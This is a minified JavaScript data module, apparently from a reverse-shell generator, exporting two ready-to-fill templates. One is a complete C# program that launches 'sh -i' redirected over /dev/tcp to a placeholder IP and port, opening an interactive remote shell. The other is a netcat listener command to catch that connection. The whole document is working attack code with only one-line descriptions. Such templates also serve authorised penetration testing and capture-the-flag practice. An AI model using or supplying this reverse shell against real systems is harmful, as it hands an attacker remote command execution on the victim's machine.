const t=[{title:"C# Bash -i Reverse Shell",template:`using System;
using System.Diagnostics;

namespace BackConnect {
  class ReverseBash {
	public static void Main(string[] args) {
	  Process proc = new System.Diagnostics.Process();
	  proc.StartInfo.FileName = "sh";
	  proc.StartInfo.Arguments = "-c \\"sh -i >& /dev/tcp/{ip}/{port} 0>&1\\"";
	  proc.StartInfo.UseShellExecute = false;
	  proc.StartInfo.RedirectStandardOutput = true;
	  proc.Start();

	  while (!proc.StandardOutput.EndOfStream) {
		Console.WriteLine(proc.StandardOutput.ReadLine());
	  }
	}
  }
}`,description:"A C# reverse shell that launches a Bash interactive shell connecting back to IP {ip} on port {port}."},{title:"Netcat Listener",template:"nc -lvnp {port}",description:"Listener to catch the reverse shell on port {port}."}],e={commands:t};export{t as commands,e as default};
